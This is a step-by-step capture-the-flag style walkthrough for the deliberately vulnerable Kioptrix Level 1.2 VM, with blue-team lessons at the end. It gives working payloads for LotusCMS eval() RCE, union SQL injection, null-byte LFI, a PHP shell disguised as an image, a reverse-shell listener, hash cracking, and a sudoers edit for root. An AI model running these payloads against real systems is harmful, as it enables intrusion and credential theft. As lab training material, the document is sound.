# Kioptrix: Level 1.2 (#3) — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| **Machine** | Kioptrix: Level 1.2 (#3) |
| **Difficulty** | Easy |
| **Author** | loneferret (Kioptrix) |
| **Released** | April 18, 2011 |
| **VulnHub Entry** | [Kioptrix: Level 1.2 (#3) on VulnHub](https://vulnhub.com/entry/kioptrix-level-12-3,24/) |
| **Download** | [Kioptrix: Level 1.2 (#3) OVA](https://vulnhub.com/entry/kioptrix-level-12-3,24/#download) |
| **Attacker** | Kali Linux (attacker IP `192.168.56.10`, target IP `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu, PHP web app "LigGoat" / LotusCMS + Gallarific) |

> **Important setup step:** the author instructs you to point `kioptrix3.com` at the VM's IP. Add a line to your hosts file **on Kali**:
>
> ```bash
> echo "192.168.56.101 kioptrix3.com" | sudo tee -a /etc/hosts
> ```
>
> The web app uses virtual-host/redirect logic that behaves best when you browse it by name. This guide uses `192.168.56.101` in commands and `kioptrix3.com` in browser URLs.

## 0. What you will learn

- **Enumeration of a LAMP web app:** Apache + PHP + MySQL and its directory structure.
- **Authentication bypass by SQL injection:** Logging in with `' OR '1'='1`-style payloads.
- **Union-based SQL injection:** Extracting usernames/passwords from a database with `UNION SELECT`.
- **Local File Inclusion (LFI):** Reading arbitrary files (like `/etc/passwd`) through a `?system=` parameter.
- **Remote Code Execution via a vulnerable CMS:** The LotusCMS 3.0 `eval()` bug.
- **Credential discovery & cracking:** Reading MySQL creds from a config file and cracking MD5 hashes.
- **Privilege escalation via sudo + a setuid editor (`ht`):** Editing `/etc/sudoers` to become root.
- **Defensive thinking:** Blue-team lessons about CMS patching, config secrets, and dangerous sudo rules.

## 1. Reconnaissance — finding the target

```bash
sudo arp-scan --localnet
```

> **How to read it:** Lists live hosts on your lab subnet. The Kioptrix VM is the non-Kali entry. Note its IP (example: `192.168.56.101`).

```bash
nmap -sn 192.168.56.0/24
```

> **How to read it:** `-sn` is a host-discovery sweep. Confirm the target responds before scanning ports.

Remember to set up name resolution (see the box at the top): add `192.168.56.101 kioptrix3.com` to `/etc/hosts`.

![host discovery](images/01-recon-netdiscover.png)

## 2. Enumeration

### 2.1 Port and service scan

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80,139,445,3306 -oA scans/services 192.168.56.101
```

> **How to read it:** The first command finds every open TCP port; the second fingerprints the interesting ones. `-sC` runs default scripts (useful banner-grabbers), `-sV` gets versions.

### 2.2 Realistic expected output

Exact banners vary by build, but expect roughly:

```text
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 4.7p1 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.4 with Suhosin-Patch)
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: MYGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: MYGROUP)
3306/tcp open  mysql       MySQL 5.0.51a
```

> **How to read it:** A classic **LAMP** box: Apache + PHP on port 80, MySQL 5.0.51a, plus SMB. The web app is our way in.

### 2.3 Directory/content discovery

```bash
feroxbuster -u http://kioptrix3.com/ -w /usr/share/wordlists/dirb/common.txt
```

or

```bash
gobuster dir -u http://kioptrix3.com/ -w /usr/share/wordlists/dirb/common.txt
```

> **How to read it:** These brute-force common paths. Look for `/phpmyadmin`, `/gallery`, `/gadmin`, and any backup/config files. `phpMyAdmin` presence tells us a MySQL database backs the site.

**Browse the site:**

```bash
firefox http://kioptrix3.com/ &
```

You will see a "LigGoat Security" site with a **login page** that advertises **LotusCMS**. There is also a **gallery** (a "Gallarific" photo gallery).

> **How to read it:** Two applications, two potential bug classes: the CMS login (SQLi / CMS RCE) and the gallery (SQLi). Any one of them can start the chain.

![nmap and directory scan](images/02-nmap.png)

## 3. Foothold

There are **several legitimate paths** here — that is by design (the author says so). Below are the three most common, all beginner-relevant.

### 3.1 Option A — LotusCMS 3.0 `eval()` Remote Code Execution

LotusCMS 3.0 passes the `page` parameter into PHP's `eval()`, which evaluates a string **as code**. If we can inject PHP, our code runs.

**Research it first (on Kali):**

```bash
searchsploit lotuscms
```

Example output:

```text
LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit) | php/remote/18565.rb
LotusCMS 3.0.3 - Multiple Vulnerabilities                       | php/webapps/16982.txt
```

> **How to read it:** EDB **18565** is the Metasploit module; EDB **16982** documents the underlying multiple vulnerabilities. The core idea: break out of the `eval()` context and run your own PHP.

**Manual proof (URL parameter):** visit something like

```text
http://kioptrix3.com/index.php?page=index');phpinfo();//
```

> **How to read it:** `');` closes the CMS's own code and `phpinfo();` is our injected PHP. If a `phpinfo()` page appears, code execution is confirmed. From there, swap `phpinfo();` for a reverse shell.

**Stand-alone (no Metasploit) route:** a popular community script compiles this into a menu-driven exploit:

```bash
git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit
cd LotusCMS-Exploit
chmod +x lotusRCE.sh
./lotusRCE.sh kioptrix3.com /
```

> **How to read it:** The script checks that the target is vulnerable, then asks for your **IP** and **port** and a payload method (e.g. `nc -e`). Start a listener first:
>
> ```bash
> nc -lvnp 4444
> ```
>
> When it succeeds you get a shell as **`www-data`**.

> **Metasploit alternative:** `use exploit/multi/http/lcms_php_exec`, set `RHOSTS`, `LHOST`, `LPORT`, `URI /`, then `run`.

**Confirm and upgrade the shell:**

```bash
id
python -c 'import pty; pty.spawn("/bin/bash")'
```

Expected `id`:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **How to read it:** `www-data` is the web server account — low privileged. The `python` line upgrades to a proper TTY.

### 3.2 Option B — Union-based SQL injection in the gallery

The gallery sorts photos by a parameter (`gallery.php?id=1&sort=photoid`). That `id`/`sort` is injectable. The classic public payload (EDB 15891) uses `UNION SELECT` to dump the `gallarific_users` table:

```text
http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6+from+gallarific_users--
```

> **How to read it:** `and 1=2` forces the original query to return nothing so our `UNION SELECT` rows are what display. `group_concat(...)` collapses the admin row into one string. You should see an admin username/password in plain text (commonly `admin : n0t7t1k4`).

**Automate with sqlmap (optional):**

```bash
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid" -p id,sort --dbms=mysql --dbs
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid" -p id,sort -D gallery -T gallarific_users --dump
```

> **How to read it:** `--dbs` lists databases; `-D gallery -T gallarific_users --dump` extracts that table. The `gallarific_users` admin password is stored in **plain text** — a serious app flaw.

### 3.3 Option C — Local File Inclusion (LFI)

The blog/login page renders content from a `system=` parameter:

```text
http://kioptrix3.com/index.php?system=../../../../../../etc/passwd%00.html
```

> **How to read it:** `../` climbs directories; `%00` is a **null byte** that truncates the trailing `.html` the app appends. If you see the contents of `/etc/passwd`, the page is including arbitrary local files. This reveals valid usernames like `loneferret` and `dreg`.

**Bonus — combine LFI + gallery upload into RCE:** the gallery exposes a hidden `/gadmin` admin area (its link is commented out in the page source). Log in with the admin creds from Option B, upload a PHP shell disguised as an image (e.g. `shell.jpg`), then trigger it through the LFI:

```text
http://kioptrix3.com/index.php?system=../../../../../../home/www/kioptrix3.com/gallery/photos/<your-uploaded-file>.jpg%00.html&cmd=id
```

> **How to read it:** The uploaded "image" is valid enough to be stored, but its `.jpg` content is actually PHP. The LFI includes the file, PHP executes it, and `cmd=id` runs your command. This is the "file upload + LFI = RCE" chain.
> **Why it works:** The app trusts the file extension for storage but *executes* whatever is included — a classic "content/extension mismatch."

![LotusCMS login and shell](images/03-foothold.png)

## 4. Privilege escalation

### 4.1 Find database credentials in a config file

As `www-data`, read the web app's config (exact path may vary by build):

```bash
grep -RniE "password|pass|mysql" /home/www/kioptrix3.com/gallery/gconfig.php 2>/dev/null
cat /home/www/kioptrix3.com/gallery/gconfig.php
```

> **How to read it:** Config files often hard-code secrets. Here you typically find the MySQL **root** account and its password (community writeups report it as `fuckeyou` on the standard build).

### 4.2 Read the user table

```bash
mysql -u root -p
# enter the password from gconfig.php (e.g. fuckeyou)
```

Then inside the MySQL prompt:

```sql
SHOW DATABASES;
USE gallery;
SELECT * FROM dev_accounts;
```

Example output:

```text
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
+----+---------------------------------------------------+
```

> **How to read it:** The `password` values are **32-character MD5 hashes**. These are fast to crack.

### 4.3 Crack the hashes

```bash
echo '0d3eccfb887aabd50f243b3f155c0f85' > hashes.txt
echo '5badcaf789d3d1d09794d8f021f40f0e' >> hashes.txt
hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

> **How to read it:** `-m 0` selects raw MD5. `--show` prints already-cracked pairs. Community writeups report the plaintexts as **`Mast3r`** (`dreg`) and **`starwars`** (`loneferret`). (Use `john` instead of `hashcat` if you prefer.)

### 4.4 SSH in as `loneferret`

```bash
ssh loneferret@192.168.56.101
# password: starwars
```

> **How to read it:** Users reuse passwords. The database hash cracked to the same password used for the system account.

### 4.5 Escalate via sudo + the `ht` editor

Check what the user is allowed to run as root:

```bash
sudo -l
```

Example output:

```text
User loneferret may run the following commands on this host:
    (root) NOPASSWD: /usr/local/bin/ht
```

> **How to read it:** `loneferret` can run the **`ht` editor** as `root` with **no password** (`NOPASSWD`). A text editor running as root can edit *any* file — including `/etc/sudoers`.

Run it (set the terminal type first, or `ht` may complain about `xterm-256color`):

```bash
export TERM=xterm
sudo ht
```

Inside `ht`:
1. Press **F3** (or use the File menu, often **Alt+F**) and open `/etc/sudoers`.
2. Find the `loneferret` line and add `ALL=(ALL) ALL` (or grant `/bin/su`).
3. Save (often **F2**) and quit.

Then:

```bash
sudo su
```

```text
root@Kioptrix3:/home/loneferret# whoami
root
```

> **How to read it:** `sudo su` now succeeds because we granted ourselves full sudo rights. `whoami` returns `root`.
> **Alternative root routes:** (a) the `ht` editor can open `/etc/shadow` to read the root hash, or (b) since we can edit `/etc/passwd`, add a new UID-0 user with an `openssl passwd -1` hash and `su` to it.

**Read the proof file:**

```bash
cat /root/Congrats.txt
```

> **How to read it:** The root directory contains a congratulatory file rather than a flag. The win is a root shell.

![sudo ht and root](images/04-root-escalation.png)

## 5. Summary of vulnerabilities

| Vulnerability | CVE | Affected Component | Port(s) | Impact | Notes |
|---|---|---|---|---|---|
| LotusCMS 3.0 `eval()` code injection | See EDB 18565 / 16982 | LotusCMS 3.0 (`page` parameter) | 80 (HTTP) | Remote Code Execution as `www-data` | PHP `eval()` on unsanitized input. |
| Union-based SQL injection | N/A (design flaw) | Gallarific gallery (`gallery.php`) | 80 (HTTP) | Database read (plain-text admin creds) | `id`/`sort` parameters injectable. |
| Local File Inclusion | N/A (design flaw) | `index.php?system=` | 80 (HTTP) | Arbitrary file read → RCE with upload | Null-byte truncation bypasses appended suffix. |
| Hidden admin area + unrestricted upload | N/A (design flaw) | Gallarific `/gadmin` | 80 (HTTP) | Upload of PHP code | Admin link only "hidden," not removed. |
| Hard-coded DB credentials in config | N/A (misconfiguration) | `gallery/gconfig.php` | filesystem | MySQL root access | Secrets in cleartext in a web-readable file. |
| Weak password hashing + reuse | N/A (weakness) | `dev_accounts` MD5 hashes | filesystem / 22 | Credential cracking → SSH | Unsalted MD5; same password reused for SSH. |
| Dangerous sudo rule | N/A (misconfiguration) | `/usr/local/bin/ht` run via sudo | local | `loneferret` → root | Root text editor can edit `/etc/sudoers`. |

> **How to read it:** Multiple independent flaws — any one of several chains reaches `root`. That is why the author says there is "more than one way."

## 6. Defensive lessons (blue team)

- **Patch your CMS and plugins.** The LotusCMS `eval()` bug is a known, dated RCE. Unknown/EOL CMS software is a standing invitation.
- **Never `eval()` untrusted input, never include user-controlled paths.** Both are direct code-execution primitives. Validate against an allow-list and resolve real paths server-side.
- **Use parameterized queries everywhere.** This eliminates both the login SQLi and the gallery union injection.
- **Do not store secrets in config files served by the web server.** Scope file permissions, keep credentials in a secrets manager, and never grant the web DB user `root`.
- **Hash passwords properly.** Use a slow, salted algorithm (bcrypt/scrypt/Argon2). Unsalted MD5 is effectively plaintext to an attacker.
- **Eliminate password reuse and enforce password policy.** One cracked DB hash should not equal SSH access.
- **Audit sudo rules ruthlessly.** Granting `sudo` on an *editor* or any program that can spawn a shell or write files is equivalent to granting root. Restrict sudo to specific, non-interactive commands.
- **Remove hidden functionality.** A commented-out `/gadmin` link is not access control — the endpoint still works.

## 7. References

Real community writeups consulted during research (they document these paths):

- [VulnHub – Kioptrix: Level 1.2 Walkthrough — steflan-security](https://steflan-security.com/vulnhub-kioptrix-level-1-2-walkthrough/)
- [Kioptrix: Level 1.2 (#3) Walkthrough — rootshellz](https://blog.rootshellz.com/kioptrix-walkthrough-3/)
- [Kioptrix Level 1.2 (#3) Walkthrough — doyler.net](https://www.doyler.net/security-not-included/kioptrix-level-1-2-3-walkthrough)
- [VulnHub – Kioptrix: Level 3 (1.2) — davidvarghese](https://blog.davidvarghese.com/posts/vulnhub-kioptrix-level-3/)
- [VulnHub Write-Up Kioptrix Level 3 — isroot.nl](https://isroot.nl/2018/10/03/vulnhub-write-up-kioptrix-level-3/)
- [VulnHub Entry — Kioptrix: Level 1.2 (#3)](https://vulnhub.com/entry/kioptrix-level-12-3,24/)

## 8. Screenshot checklist

- [ ] `images/01-recon-netdiscover.png` — host discovery showing the target IP
- [ ] `images/02-nmap.png` — Nmap + directory scan (Apache/PHP, `/phpmyadmin`, `/gallery`)
- [ ] `images/03-foothold.png` — LotusCMS RCE (or SQLi/LFI) leading to a `www-data` shell
- [ ] `images/04-root-escalation.png` — `sudo -l`, `sudo ht` editing `/etc/sudoers`, and `sudo su` → root
- [ ] `images/05-proof.png` — `/root/Congrats.txt` or root `whoami`

> **How to read it:** Store screenshots in `labs/kioptrix-level-12-3/images/` and reference them with the relative paths shown.

---
*Part of the [Cybersecurity101-Labs](../../README.md) collection. Educational use only in authorized lab environments.*
